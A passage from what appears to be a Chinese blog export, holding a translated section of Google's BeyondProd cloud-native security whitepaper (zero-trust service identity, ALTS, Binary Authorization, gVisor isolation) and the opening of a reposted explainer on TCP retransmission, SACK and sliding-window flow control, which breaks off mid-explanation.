identity, not the location in the production network, such as IP or hostname identity”. 云原生和应用部署偏传统的安全模型主要关注基于边界的安全（perimeter-based security），只靠这种模型不足以保护云原生架构的安全。 考虑下面这个例子： 单体应用 部署在私有的企业数据中心 数据中心采用传统“接入-汇聚-核心”三级网络架构（three-tier architecture） 应用和物理资源都有足够的容量，能抗住突发事件的峰值负载 这种有特殊硬件和网络需求的应用，都会特意部署到特殊的机器，通常情况下，这些机器都有固定的 IP 地址。在这种情况下，应用的： 发布频率很低 发布很费劲 很难协调，因为变更会同时影响应用的不同部分 导致应用难以更新，轻易不更新，安全补丁也不能及时打上去 如果是云原生模型，情况就不同了： 容器将应用的可执行文件与底层的宿主机操作系统解耦，使得应用更易漂移（more portable）。 容器的设计使用方式是不可变（be used immutably），这意味着一旦部署容器就不会再变 —— 因此容器的重新构建和重新部署（rebuilt and redeployed）会更加频繁。 Jobs 可根据负载大小灵活扩展（scaled to handle load），负载升高时部署新 jobs， 负载降下去之后部分 jobs 销毁。 容器经常会重启、销毁或重新调度，因此有硬件和网络的再利用和共享率更高。 基于标准的构建和分发流程（build and distribution process），即使多个团队独立管 理他们的微服务开发，团队之间的开发过程也会更加一致和统一。 最终结果：能在开发过程中的更早阶段开始考虑安全方面的问题（例如，安全评审 、代码扫描、漏洞管理）。 给安全工作带来的启示（Implications for security）我们已经讨论了很多边界内部非受信（untrusted interior）的情况，即 BeyondCorp 中的用户，也适用于 BeyondProd 中的微服务 —— 但这需要安全做出哪些变化？表 1 列出了传统基础设施安全和云原生架构安全的对比。表中还给出了从前者迁移后者需要做哪些事情。 表 1：迁移到云原生架构面临的安全需求 传统基础设施安全 云原生安全 安全需求 基于边界的安全（例如防火墙），认为边界内可信 零信任安全，服务到服务通信需认证，环境内的服务之间默认没有信任 保护网络边界（仍然有效）；服务之间默认没有互信 应用的 IP 和硬件（机器）固定 资源利用率、重用、共享更好，包括 IP 和硬件 受信任的机器运行来源已知的代码 基于 IP 的身份 基于服务的身份 同上 服务运行在已知的、可预期的位置 服务可运行在环境中的任何地方，包括私有云/公有云混合部署 同上 安全相关的需求由应用来实现，每个应用单独实现 共享的安全需求，集成到服务中，集中地实施策略（enforcement policy） 集中策略实施点（choke points），一致地应用到所有服务 对服务如何构建和评审实施的限制较少 安全相关的需求一致地应用到所以服务 同上 安全组件的可观测性较弱 有安全策略及其是否生效的全局视图 同上 发布不标准，发布频率较低 标准化的构建和发布流程，每个微服务变更独立，变更更频繁 简单、自动、标准化的变更发布流程 部署在虚拟机或物理机上，用物理机或 hypervisor 做隔离 二进制打包到容器镜像，运行在共享的操作系统上，需要 workload 隔离机制 在共享操作系统的 workload 之间做隔离 接下来对以上表格做一些解释。 从 “基于边界的安全”（perimeter-based security）到 “零信任安全”（zero-trust security）在传统安全模型中，应用可以依赖私有数据中心的边界防火墙对入向流量做安全防护。 在云原生安全模型中，边界防火墙仍然必要，正如在 BeyondCorp 模型中一样，但单靠防火墙已经不够了。 这里并没有引入新的待解决的安全问题，而是意识到这样一个事实：如果单靠防火墙无法完 全保护企业网络（corporate network），那单靠防火墙同样不能完全保护生产网络（ production network）。 在零信任安全模型中，内部流量之间默认不再有信任 —— 需要其他的安全控制，例如认证和加密。同时，向微服务的转变提供了一个对传统安全模型进行重新思考的机会。 当去掉仅仅依赖网络边界（例如，防火墙）这一假设后，就可以按服务（service）对网络进行进一步划分。 顺着这个思路，更进一步，可以实现微服务级别的隔离（microservice-level segmentation），而服务之间无固有的信任（no inherent trust between services）。 在这种微服务架构下，流量会有不同层次的信任，每层都有不同的控制方式 —— 而 不再仅仅依据是内部流量还是外部流量来做区分。 从 “固定 IP 和硬件” 到 “更多地共享资源”在传统安全模型中，应用都是部署到特定的机器上，这些机器的 IP 地址很少发生变化。这意味着安全工具看到的是一个相对静态的架构地图（architecture map），其中的应用 都是以可预知的方式联系到一起的 —— 因此防火墙这类的工具中，安全策略可以用 IP 地址 作为标识符（identifiers）。 但是，在云原生世界中，随着共享宿主机和变化频繁的 jobs，使用防火墙控制微服务间的访问变得不可行。我们不能再假设一个特定的 IP 地址会对应到一个特定的服务。因此， 身份应该基于服务，而不是 IP 地址或主机名（hostname）。 从 “应用特定的安全实现” 到 “共享的安全需求集成到服务栈中”在传统安全模型中，每个应用负责实现自己的安全需求，与其他服务的安全实现完全独立。 这些安全需求包括： 身份管理（identity management） SSL/TLS termination 数据访问管理（data access management） 这种方式会导致不一致的实现，或者未能全局地解决某些安全问题，因为这些问题遍布在多 个地方，修复更加困难。 在云原生世界中，服务之间重用（reuse）组件的频率更高，并且有中心式的安全策略实施点（choke points），使得各服务的策略实施更加一致。可以使用不同的安全服务实施 不同的安全策略。此时每个应用不再需要自己实现关键的安全服务，你可以将这些安全策略 应用到独立的微服务（例如，一种策略用于保障用户数据的授权访问，另一种策略用于保证 使用了最新的 TLS 加密套件）。 从 “特定的、频率较低的发布流程” 到 “标准化的、频率更高的发布流程”传统安全模型中，共享的服务非常少。代码（在整个应用内）更加分散，与本地开发（ local development）的耦合更高，这意味着如果一个变更会影响到应用的多个部分，我们 很难估计它可能导致的影响 —— 结果，发布频率变低，很难协调发布流程。在变更的时候， 开发者可能需要直接更新每个组件（例如，SSH 到虚拟机，更新某个配置）。综合起来，这 导致线上存在很多寿命极长的应用（extremely long-lived applications）（的实例）。 从安全的角度看，由于代码（在整个应用内）更加分散，因此更难 review；如果发现一个漏洞，要确保这个漏洞在所有代码中都修复了甚至更加困难。 迁移到频率更高、更加标准化的云原生发布后，安全在软件开发生命周期的位置就能够左移 [2]。这使得实现一致的安全策略实施（包括常规的安装安全补丁）更加简单。 从 “物理机或 hypervisor 隔离的 workload” 到 “二进制打包、运行在共享机器上、需要更强隔离性的 workload”传统安全模型中，workloads 都是调度到各自专属的实例上，不存在共享资源，因此机器和网络边界能够有效地保护机器上的应用；另一方面，物理机器、hypervisor 和传统防 火墙也能够有效地隔离 workload。 在云原生世界中，workloads 都是容器化的，可执行文件打包到容器镜像，然后调度到共享 资源的机器上执行。因此，workload 之间需要有更强的隔离机制。通过网络控制、sandbox 之类的技术，能够部分地将 workload 隔离到不同的微服务。 安全原则在设计云原生架构的过程中，我们希望在多个方面同时加固我们的安全（concurrently strengthen our security） —— 因此我们制定和优化了下面的这些安全原则： 在边界保护网络：能够在网络攻击和来自公网的未授权流量面前保护 workload。 虽然基于防火墙的方法对云原生来说并不是一个新概念，但它仍然是一条最佳安全 实践。在云原生环境中，边界方式（perimeter approach）用于最大程度地在来自 公网的未授权流量和潜在攻击（例如，大规模 DoS 攻击）面前保护基础设施。 服务之间默认没有互信：因此，只有已知的、受信的、认证过的调用方才能访问服务。 这能防止攻击者利用未受信的代码（untrusted code）访问服务。如果一个服务被攻陷了，这个服务能够阻止攻击者执行能扩展其访问范围的动作。这种双向非互信（ mutual distrust）有助于限制被入侵时的爆炸半径。 受信的机器运行来源已知的代码：这样就限制了服务只能使用认证过的代码和配置， 并且只能运行在认证过的、验证过的环境中。 在 Choke points 对所有服务实施一致的策略。 例如，在 choke point 验证访问用户数据的请求，服务访问权限从已授权终端用户的 已验证请求中推导（derived from a validated request from an authorized end user），管理员访问权限申请需要证明有业务必要（business justification）。 简单、自动化、标准化的发布变更流程：更容易评审基础设施的变更对安全的影 响；更新安全补丁对线上业务几乎没有影响。 在共享操作系统的 workloads 之间做隔离：一个服务被入侵后，不会影响同宿 主机上其他服务的安全。这限制了潜在入侵后的“爆炸半径”。 我们的最终目标是：实现整个基础设施之上的自动化安全控制，不依赖人工参与。 安全应当能以与服务一样的方式进行扩展。 对于服务来说，安全是日常，不安全是例外（secure by default and insecure by exception）。 人工干预应当是例外，而不是日常，并且人工干预的过程应当是可审计的。 最终我们能够基于服务部署时的代码和配置对服务进行认证，而不是基于对部署这个服务的人。 综上，这些安全原则的实现意味着，容器和其内运行的微服务应该是可部署的、能够与彼此通信的、共享资源的，且不会削弱云原生架构的优良特性（例如，简单的 workload 管理、 自动扩缩容、高效的可执行文件打包）。在不给微服务开发者增加负担、无需他们了解底层基础设施的安全和实现细节的前提下，这些目标仍然是可实现的。 Google 的内部安全服务为保护 Google 的云原生基础设施，我们设计和开发了一些内部工具和服务。下面列出的这些工具和服务协同工作，实现了前面定义的安全原则。 Google Front End (GFE)： 终结来自终端用户的连接，提供一个集中实施 TLS 最佳实践的位置（central point for enforcing TLS best practices）。 虽然我们的重心已经不再是基于边界的安全，但 GFE 仍然是我们保护内部服务免受 DoS 攻击的安全策略重要组成部分。 GFE 外侧是用户连接到达 Google 后的第一个位置点；内侧负责将流量负载均衡和重路由（ rerouting）到合适的 region。在我们的基础设施中，GFE 是边缘代理，将流量路由到正 确的微服务。 Application Layer Transport Security (ALTS，应用层传输安全)： 用于 RPC 认证、完整性验证和加密。 ALTS 是 Google 基础设施中服务间的一个双向认证和传输加密系统。身份（ identities）通常与服务（services ）绑定，而不是与服务器名字或宿主机（server name or host）绑定。这使得无缝的微服务复制、负载均衡和跨宿主机重调度更加方便。 Binary Authorization（二进制授权）for Borg and Host Integrity：分别用于微服务和机器的完整性验证。 Binary Authorization for Borg (BAB，Borg 二进制授权)： 一种部署时检查（deploy-time enforcement check）机制，确保代码在部署之前符 合内部安全要求。BAB 检查包括由其他工程师 review 过的变更、提交到仓库的 代码、在专属基础设施上构建出来的可验证二进制文件。在我们的基础设施中，BAB 防止了未授权微服务的部署。 Host Integrity (HINT，宿主机完整性)：通过一个安全的启动过程，验证宿主 机系统软件的完整性，由安全的微控制器硬件在背后支持（secure microcontroller hardware）。HINT 检查包括验证 BIOS、BMC、Bootloader 和操作系统内核的数字签名。 Service Access Policy 和 End user context tickets：用于限制对数据的访问。 Service Access Policy（服务访问策略）: 限制服务之间的数据访问。当从一个服务向另一个服务发起 RPC 调用时， Service Access Policy 会定义访问对端服务的数据时所需的认证、鉴权和审计策略。 这会限制数据访问方式、授予最小级别的访问权限，并规定这种访问应当如何审计。 在 Google 基础设施中， Service Access Policy 限制了一个微服务对另一方微服务的数据的访问，并支持访问控制的全局分析。 End user context (EUC，终端用户上下文) tickets: 这些 tickets 由 End User Authentication service（终端用户认证服务）颁发，给每个服务提供一个用户身份 （user identity），这个身份与他们的服务身份（service identity）是独立的。 这些 tickets 是有完整性保护的（integrity-protected），中心式颁发的（centrally-issued）， 可转发的凭证（forwardable credentials），能够证明某个正在请求服务的终端用户的身份。 这使得服务之间不需要彼此信任，基于 ALTS 的对端身份（peer identity via ALTS）经常不足以完成授权，因为这种授权决定通常还要基于终端用户的身份。 用于蓝绿部署的 Borg 工具集 [3]：在执行维护任务时，这种工具负责对运行中的 workloads 进行迁移。 方式：现有的 Borg job 不动，加入一个新 Borg job，然后负载均衡器将流量逐步从 前者切到后者。 这种方式使得升级微服务时不会引起服务中断（downtime），终端用户无感知。 这种工具用于无间断地服务升级（服务添加了新特性），以及重要安全更新（例如 HeartBleed 和 Spectre/Meltdown)。如果变更会影响到 Google Cloud 基础设施，我们会使用热迁移（live migration） 保证虚拟机 workload 不受影响。 gVisor：用于 workload 隔离。 gVisor 使用一个用户态内核拦截和处理系统调用，减少与宿主机的交互以及潜在的攻击面。这个内核提供了运行一个应用所需的大部分功能，但缩小了应用能够访问到的宿主机内核表面（host kernel surface）。 在 Google 的基础设施中，内部应用和 Google Cloud 客户的应用共享宿主机，而 gVisor 就是我们隔离二者的重要工具之一。 表 2 列出了 Google 基础设施中，前面提到的各种安全原则所对应的工具。 表 2：安全原则和对应的 Google 内部工具 安全原则 Google 内部安全工具/服务 在网络边界做防护 GFE：管理 TLS termination 以及入向流量策略 服务间无内在的互信 ALTS：用于 RPC 认证、完整性检查、加密和服务身份 受信的机器运行来源已知的代码 BAB：代码来源验证。HINT：机器完整性验证 在 choke points 对所有服务实施一致的策略 Service Access Policy：限制服务间如何访问数据。EUC ticket：证明初始请求者（original requester）的身份 简单、自动、标准化的变更发布 Borg tooling：蓝绿部署 隔离共享操作系统的 workloads gVisor 综合到一起本节描述在云原生世界中，前面讨论的各组件如何组织到一起，响应终端用户的请求。 这里我们看两个例子： 跟踪一个典型的用户数据请求，从其创建到请求到达目的地 跟踪一次代码变更，从开发直至发布到生产环境 需要说明的是，这里列出的技术并不是都会用于 Google 基础设施中的每个部分，具体 用到哪些取决于服务和 workloads。 例子：访问用户数据流程 Fig 1. Google 云原生架构安全控制 —— 访问用户数据 如图 1 所示， GFE 收到用户请求 GFE 终止 TLS 连接，通过 ALTS [4] 将请求转发给合适的服务前端（service’s frontend） 应用前端使用一个中心式的 End User Authentication (EUA) 服务对用户请求进行认证 ，如果成功，会得到一个短期有效的、加密的 end user context ticket (EUC) 应用前端在请求中带上 EUC ticket，然后通过 ALTS 向存储后端服务发起 RPC 请求。 后端服务通过 Service Access Policy 来保证： 前端服务的 ALTS 身份是经过授权的，允许向后端服务发起请求，并且带了 EUC ticket。 前端的身份已经受 Binary Authorization for Borg (BAB) 保护。 请求中所带的 EUC ticket 是合法的。后端服务检查用户的 EUC ticket 是经过授权的 ，才允许访问其所请求的数据。 以上任何一步检查失败了，请求就会被拒绝。 很多情况下，后端调用形成一个调用链，每个中间服务都会在入向（inbound）RPC 执行 Service Access Policy 检查，并在出向（outbound）RPC 中带上 EUC ticket。 如果这些检查都通过了，数据就会返回给已授权的应用前端，后者再转发给已授权的用户。 机器和微服务 ALTS 凭证： 每个机器都有一个由 HINT 系统颁发的 ALTS 凭证，只有 HINT 验证过这台机器启动 是正常的（machine boot was successful），这个 ALTS 凭证才能被解密。 大部分 Google服务都以微服务的方式运行在 Borg 上，这些微服务都有各自的 ALTS身份。 Borgmaster [5] 基于微服务的身份向 workloads 授予 ALTS 微服务凭证，如图 1 所示。 机器级别的 ALTS凭证成为了提供微服务凭证的安全通道（secure channel for provisioning microservice credentials），因此实际上只有成功地通过了 HINT 检查 的机器才能运行微服务 workloads。 例子：代码变更流程 Fig 2. Google 云原生架构安全控制 —— 代码变更 如图 2 所示， 开发者修改了某个微服务，这些变动必须提交到我们的中心式代码仓库进行 code review。 code review 通过之后，变更会提交到一个中心式的、受信任的构建系统，后者会产生一个包（package），这个 package 附带了一个经过签名的、可验证的 build manifest 证书。在部署时（deployment time），BAB 会对已签名的证书进行验证。 所有 workload 更新（不管是例行更新，还是紧急安全补丁）都以蓝绿部署方式进行。 GFE 通过负载均衡将流量切换到新部署的版本上，保证业务的连续。 所有的 workloads 都需要隔离。如果 workload 可信程度较低，例如，是多租户 workload 或源代码来自 Google 之外，这种 workload 可能会被部署到 gVisor 保护的环 境中，或者利用其它层的隔离。如果应用的一个实例被入侵了，这种隔离能保证其它的实例不受影响。 BeyondProd 在 Google 的落地押宝云原生（Going all in）向云原生的转变，再加上基础设施之上的合理安全措施，使得 Google 能够提供非常强的安全特性，这包括我们的内部 workloads ，也包括外部（Google Clod）workloads。 通过构建共享的组件，每个开发者自己需要实现的公共安全需求降到了最低。 理想情况下，安全功能只应该有很少部分（甚至完全不应该）集成到每个应用中，而应该作 为一个底层的交换网格（fabric）连接各微服务。这种架构通常称为 service mesh。这同 时也意味着，安全能够从常规的开发或部署活动中独立出来，单独管理和实现。 转向云原生，Google 做了什么Google 向云原生的转变主要涉及两个方面的改造工作： 基础设施 开发流程 我们是同时对这两方面做出调整的，但二者是可以解耦的，也可以针对二者分别做改造。 改造基础设施我们首先构建了一个非常强大的提供服务身份、认证和鉴权的基础平台。 有了这样一个受信的服务身份平台，我们就能实现更高层的安全能力，这些高层能力依赖 服务身份做验证，例如 Service Access Policies 和 EUC tickets。 为使转变过程对新服务和老服务都比较简单平滑，ALTS 最开始是以函数库加辅助守护进程（a library with a single helper daemon） 的方式提供的。 daemon 运行在宿主机上，会被每个服务调用，随着时间推移，演进成一个使用服务凭证 （a library using service credentials）的函数库。 ALTS 库无缝集成到核心 RPC 库 —— 这大大方便了其被应用接入（gain wide adoption） ，而且不会给每个开发团队增加显著负担。 ALTS 是 Service Access Policies 和 EUC tickets 的前提，必须先于二者落地。 改造开发流程打造一个健壮的构建和 code review 流程对 Google 至关重要。有了这些我们才能 确保运行中服务的完整性，以及 ALTS 使用的身份是有意义的。 我们实现了一个中心式的构建流程，在这里能够实施一些安全策略，例如在构建和部署时， 执行双人 code review 和自动化测试。（更多部署相关的细节，见 Binary Authorization for Borg whitepaper） 有了这些基础之后，开始尝试在我们的环境中运行外部非受信代码。为此，我们使 用了沙盒（sandboxing）—— 最初用 ptrace，后来切换到 gVisor。类似地，蓝绿部署给安 全提供了显著便利（例如安全补丁），并增强了可靠性。 在初期，我们很快意识到这样一点：服务的安全验证失败时，不应直接拒绝，而应打印出 验证失败的策略日志（logging policy violations rather than blocking violations ）。这能够带来两方面好处： 将服务迁移到云原生环境的过程中，给了服务的 owner 一个测试代码改动和评估对其服 务影响的机会 使得我们能及时修 bug，以及识别应当提供给服务团队哪些额外功能 例如，当一个服务新接入 BAB 时，服务 owner 会打开 audit-only 模式。这有助于 识别出不符合要求的代码和工作流。一旦解决了发现的这些问题，他们就可以关闭 audit-only 模式，切换到 enforcement 模式。 我们会先使用 gVisor 对 workloads进行沙盒测试，即使沙盒提供的能力和我们的需求之间 仍有差距，我们会不断找出这些差距，逐步增强沙盒的功能。 带来的收益正如 BeyondCorp 帮助我们迈过了基于边界的安全模型时代，BeyondProd 也代表了一个类似的飞跃：这次解决的是生产环境的安全问题。 BeyondProd 方法描述了一个云原生安全架构，其： 假设服务之间没有信任 提供了 workload 之间的隔离 部署时验证，只有合法平台构建出来的应用（centrally built applications）才允许部署 自动化漏洞管理 对核心数据执行强访问控制 BeyondProd 架构促使 Google 研发了几个新系统来满足这些需求。 实际中，我们经常看到安全总是在最后时刻才被人们记起（security is ‘called in’ last）——在迁移到新架构的决定已经做出之后。更早地让你们的安全团队参与进来，并且关 注于新的安全模型带来的收益，例如更简单的补丁管理和更强的访问控制，云原生架构就能 为应用研发团队和安全团队带来巨大收益。 将本文描述的安全原则应用到你们的基础设施中，就能增强 workloads 的部署、 workloads 之间的通信安全，以及 workloads 之间的隔离性。 注 Borg is Google’s cluster management system for scheduling and running workloads at scale. Borg was Google’s first unified container management system, and the inspiration for Kubernetes. “Shifting left” refers to moving steps earlier in the software development lifecycle, which may include steps like code, build, test, validate, and deploy. Lifecycle diagrams are frequently drawn from left to right, so left means at an earlier step. A blue/green deployment is a way to roll out a change to a workload without affecting incoming traffic, so that end users don’t experience any downtime in accessing the application. To better understand how traffic is routed inside Google’s infrastructure from the GFE to a service, see the How traffic gets routed section of our Encryption in Transit whitepaper. Borgmaster is Borg’s centralized controller. It manages scheduling of jobs, and communicates with running jobs on their status.","link":"/2020/06/06/BeyondProd/"},{"title":"图解TCP","text":"转载自微信公众号:小林coding 本文内容仅供学习交流，如有侵权立即删除。 前言相信大家都知道 TCP 是一个可靠传输的协议，那它是如何保证可靠的呢？ 为了实现可靠性传输，需要考虑很多事情，例如数据的破坏、丢包、重复以及分片顺序混乱等问题。如不能解决这些问题，也就无从谈起可靠传输。 那么，TCP 是通过序列号、确认应答、重发控制、连接管理以及窗口控制等机制实现可靠性传输的。 今天，将重点介绍 TCP 的重传机制、滑动窗口、流量控制、拥塞控制。 重传机制TCP 实现可靠传输的方式之一，是通过序列号与确认应答。 在 TCP 中，当发送端的数据到达接收主机时，接收端主机会返回一个确认应答消息，表示已收到消息。 但在错综复杂的网络，并不一定能如上图那么顺利能正常的数据传输，万一数据在传输过程中丢失了呢？ 所以 TCP 针对数据包丢失的情况，会用重传机制解决。 接下来说说常见的重传机制： 超时重传 快速重传 SACK D-SACK 超时重传重传机制的其中一个方式，就是在发送数据时，设定一个定时器，当超过指定的时间后，没有收到对方的 ACK 确认应答报文，就会重发该数据，也就是我们常说的超时重传。 TCP 会在以下两种情况发生超时重传： 数据包丢失 确认应答丢失 超时时间应该设置为多少呢？ 我们先来了解一下什么是 RTT（Round-Trip Time 往返时延），从下图我们就可以知道： RTT 就是数据从网络一端传送到另一端所需的时间，也就是包的往返时间。 超时重传时间是以 RTO （Retransmission Timeout 超时重传时间）表示。 假设在重传的情况下，超时时间 RTO 「较长或较短」时，会发生什么事情呢？ 上图中有两种超时时间不同的情况： 当超时时间 RTO 较大时，重发就慢，丢了老半天才重发，没有效率，性能差； 当超时时间 RTO 较小时，会导致可能并没有丢就重发，于是重发的就快，会增加网络拥塞，导致更多的超时，更多的超时导致更多的重发。 精确的测量超时时间 RTO 的值是非常重要的，这可让我们的重传机制更高效。 根据上述的两种情况，我们可以得知，超时重传时间 RTO 的值应该略大于报文往返 RTT 的值。 至此，可能大家觉得超时重传时间 RTO 的值计算，也不是很复杂嘛。 好像就是在发送端发包时记下 t0 ，然后接收端再把这个 ack 回来时再记一个 t1，于是 RTT = t1 – t0。没那么简单，这只是一个采样，不能代表普遍情况。 实际上「报文往返 RTT 的值」是经常变化的，因为我们的网络也是时常变化的。也就因为「报文往返 RTT 的值」 是经常波动变化的，所以「超时重传时间 RTO 的值」应该是一个动态变化的值。 我们来看看 Linux 是如何计算 RTO 的呢？ 估计往返时间，通常需要采样以下两个： 需要 TCP 通过采样 RTT 的时间，然后进行加权平均，算出一个平滑 RTT 的值，而且这个值还是要不断变化的，因为网络状况不断地变化。 除了采样 RTT，还要采样 RTT 的波动范围，这样就避免如果 RTT 有一个大的波动的话，很难被发现的情况。 RFC6289 建议使用以下的公式计算 RTO： 其中 SRTT 是计算平滑的RTT ，DevRTR 是计算平滑的RTT 与 最新 RTT 的差距。 在 Linux 下，α = 0.125，β = 0.25， μ = 1，∂ = 4。别问怎么来的，问就是大量实验中调出来的。 如果超时重发的数据，再次超时的时候，又需要重传的时候，TCP 的策略是超时间隔加倍。 也就是每当遇到一次超时重传的时候，都会将下一次超时时间间隔设为先前值的两倍。两次超时，就说明网络环境差，不宜频繁反复发送。 超时触发重传存在的问题是，超时周期可能相对较长。那是不是可以有更快的方式呢？ 于是就可以用「快速重传」机制来解决超时重发的时间等待。 快速重传TCP 还有另外一种快速重传（Fast Retransmit）机制，它不以时间为驱动，而是以数据驱动重传。 快速重传机制，是如何工作的呢？其实很简单，一图胜千言。 在上图，发送方发出了 1，2，3，4，5 份数据： 第一份 Seq1 先送到了，于是就 Ack 回 2； 结果 Seq2 因为某些原因没收到，Seq3 到达了，于是还是 Ack 回 2； 后面的 Seq4 和 Seq5 都到了，但还是 Ack 回 2，因为 Seq2 还是没有收到； 发送端收到了三个 Ack = 2 的确认，知道了 Seq2 还没有收到，就会在定时器过期之前，重传丢失的 Seq2。 最后，接收到收到了 Seq2，此时因为 Seq3，Seq4，Seq5 都收到了，于是 Ack 回 6 。 所以，快速重传的工作方式是当收到三个相同的 ACK 报文时，会在定时器过期之前，重传丢失的报文段。 快速重传机制只解决了一个问题，就是超时时间的问题，但是它依然面临着另外一个问题。就是重传的时候，是重传之前的一个，还是重传所有的问题。 比如对于上面的例子，是重传 Seq2 呢？还是重传 Seq2、Seq3、Seq4、Seq5 呢？因为发送端并不清楚这连续的三个 Ack 2 是谁传回来的。 根据 TCP 不同的实现，以上两种情况都是有可能的。可见，这是一把双刃剑。 为了解决不知道该重传哪些 TCP 报文，于是就有 SACK 方法。 SACK 方法还有一种实现重传机制的方式叫：SACK（ Selective Acknowledgment 选择性确认）。 这种方式需要在 TCP 头部「选项」字段里加一个 SACK 的东西，它可以将缓存的地图发送给发送方，这样发送方就可以知道哪些数据收到了，哪些数据没收到，知道了这些信息，就可以只重传丢失的数据。 如下图，发送方收到了三次同样的 ACK 确认报文，于是就会触发快速重发机制，通过 SACK 信息发现只有 200~299 这段数据丢失，则重发时，就只选择了这个 TCP 段进行重复。 如果要支持 SACK，必须双方都要支持。在 Linux 下，可以通过 net.ipv4.tcp_sack 参数打开这个功能（Linux 2.4 后默认打开）。 Duplicate SACKDuplicate SACK 又称 D-SACK，其主要使用了 SACK 来告诉「发送方」有哪些数据被重复接收了。 下面举例两个栗子，来说明 D-SACK 的作用。 栗子一号：ACK 丢包 「接收方」发给「发送方」的两个 ACK 确认应答都丢失了，所以发送方超时后，重传第一个数据包（3000 ~ 3499） 于是「接收方」发现数据是重复收到的，于是回了一个 SACK = 3000~3500，告诉「发送方」 3000~3500 的数据早已被接收了，因为 ACK 都到了 4000 了，已经意味着 4000 之前的所有数据都已收到，所以这个 SACK 就代表着 D-SACK。 这样「发送方」就知道了，数据没有丢，是「接收方」的 ACK 确认报文丢了。 栗子二号：网络延时 数据包（1000~1499） 被网络延迟了，导致「发送方」没有收到 Ack 1500 的确认报文。 而后面报文到达的三个相同的 ACK 确认报文，就触发了快速重传机制，但是在重传后，被延迟的数据包（1000~1499）又到了「接收方」； 所以「接收方」回了一个 SACK=1000~1500，因为 ACK 已经到了 3000，所以这个 SACK 是 D-SACK，表示收到了重复的包。 这样发送方就知道快速重传触发的原因不是发出去的包丢了，也不是因为回应的 ACK 包丢了，而是因为网络延迟了。 可见，D-SACK 有这么几个好处： 可以让「发送方」知道，是发出去的包丢了，还是接收方回应的 ACK 包丢了; 可以知道是不是「发送方」的数据包被网络延迟了; 可以知道网络中是不是把「发送方」的数据包给复制了; 在 Linux 下可以通过 net.ipv4.tcp_dsack 参数开启/关闭这个功能（Linux 2.4 后默认打开）。 滑动窗口 引入窗口概念的原因 我们都知道 TCP 是每发送一个数据，都要进行一次确认应答。当上一个数据包收到了应答了， 再发送下一个。 这个模式就有点像我和你面对面聊天，你一句我一句。但这种方式的缺点是效率比较低的。 如果你说完一句话，我在处理其他事情，没有及时回复你，那你不是要干等着我做完其他事情后，我回复你，你才能说下一句话，很显然这不现实。 所以，这样的传输方式有一个缺点：数据包的往返时间越长，通信的效率就越低。 为解决这个问题，TCP 引入了窗口这个概念。即使在往返时间较长的情况下，它也不会降低网络通信的效率。 那么有了窗口，就可以指定窗口大小，窗口大小就是指无需等待确认应答，而可以继续发送数据的最大值。 窗口的实现实际上是操作系统开辟的一个缓存空间，发送方主机在等到确认应答返回之前，必须在缓冲区中保留已发送的数据。如果按期收到确认应答，此时数据就可以从缓存区清除。 假设窗口大小为 3 个 TCP 段，那么发送方就可以「连续发送」 3 个 TCP 段，并且中途若有 ACK 丢失，可以通过「下一个确认应答进行确认」。如下图： 用滑动窗口方式并行处理 图中的 ACK 600 确认应答报文丢失，也没关系，因为可以通话下一个确认应答进行确认，只要发送方收到了 ACK 700 确认应答，就意味着 700 之前的所有数据「接收方」都收到了。这个模式就叫累计确认或者累计应答。 窗口大小由哪一方决定？ TCP 头里有一个字段叫 Window，也就是窗口大小。 这个字段是接收端告诉发送端自己还有多少缓冲区可以接收数据。于是发送端就可以根据这个接收端的处理能力来发送数据，而不会导致接收端处理不过来。 所以，通常窗口的大小是由接收方的决定的。 发送方发送的数据大小不能超过接收方的窗口大小，否则接收方就无法正常接收到数据。 发送方的滑动窗口 我们先来看看发送方的窗口，下图就是发送方缓存的数据，根据处理的情况分成四个部分，其中深蓝色方框是发送窗口，紫色方框是可用窗口： #1 是已发送并收到 ACK确认的数据：1~31 字节 #2 是已发送但未收到 ACK确认的数据：32~45 字节 #3 是未发送但总大小在接收方处理范围内（接收方还有空间）：46~51字节 #4 是未发送但总大小超过接收方处理范围（接收方没有空间）：52字节以后 在下图，当发送方把数据「全部」都一下发送出去后，可用窗口的大小就为 0 了，表明可用窗口耗尽，在没收到 ACK 确认之前是无法继续发送数据了。 在下图，当收到之前发送的数据 32~36 字节的 ACK 确认应答后，如果发送窗口的大小没有变化，则滑动窗口往右边移动 5 个字节，因为有 5 个字节的数据被应答确认，接下来 52~56 字节又变成了可用窗口，那么后续也就可以发送 52~56 这 5 个字节的数据了。 程序是如何表示发送方的四个部分的呢？ TCP 滑动窗口方案使用三个指针来跟踪在四个传输类别中的每一个类别中的字节。其中两个指针是绝对指针（指特定的序列号），一个是相对指针（需要做偏移）。 SND.WND：表示发送窗口的大小（大小是由接收方指定的）； SND.UNA：是一个绝对指针，它指向的是已发送但未收到确认的第一个字节的序列号，也就是 #2 的第一个字节。 SND.NXT：也是一个绝对指针，它指向未发送但可发送范围的第一个字节的序列号，也就是 #3 的第一个字节。 指向 #4 的第一个字节是个相对指针，它需要 SND.UNA 指针加上 SND.WND 大小的偏移量，就可以指向 #4 的第一个字节了。 那么可用窗口大小的计算就可以是： 可用窗口大 = SND.WND -（SND.NXT - SND.UNA） 接收方的滑动窗口 接下来我们看看接收方的窗口，接收窗口相对简单一些，根据处理的情况划分成三个部分： #1 + #2 是已成功接收并确认的数据（等待应用进程读取）； #3 是未收到数据但可以接收的数据； #4 未收到数据并不可以接收的数据； 其中三个接收部分，使用两个指针进行划分: RCV.WND：表示接收窗口的大小，它会通告给发送方。 RCV.NXT：是一个指针，它指向期望从发送方发送来的下一个数据字节的序列号，也就是 #3 的第一个字节。 指向 #4 的第一个字节是个相对指针，它需要 RCV.NXT 指针加上 RCV.WND 大小的偏移量，就可以指向 #4 的第一个字节了。 接收窗口和发送窗口的大小是相等的吗？ 并不是完全相等，接收窗口的大小是约等于发送窗口的大小的。 因为滑动窗口并不是一成不变的。比如，当接收方的应用进程读取数据的速度非常快的话，这样的话接收窗口可以很快的就空缺出来。那么新的接收窗口大小，是通过 TCP 报文中的 Windows 字段来告诉发送方。那么这个传输过程是存在时延的，所以接收窗口和发送窗口是约等于的关系。 流量控制发送方不能无脑的发数据给接收方，要考虑接收方处理能力。 如果一直无脑的发数据给对方，但对方处理不过来，那么就会导致触发重发机制，从而导致网络流量的无端的浪费。 为了解决这种现象发生，TCP 提供一种机制可以让「发送方」根据「接收方」的实际接收能力控制发送的数据量，这就是所谓的流量控制。 下面举个栗子，为了简单起见，假设以下场景： 客户端是接收方，服务端是发送方 假设接收窗口和发送窗口相同，都为 200 假设两个设备在整个传输过程中都保持相同的窗口大小，不受外界影响 根据上图的流量控制，说明下每个过程： 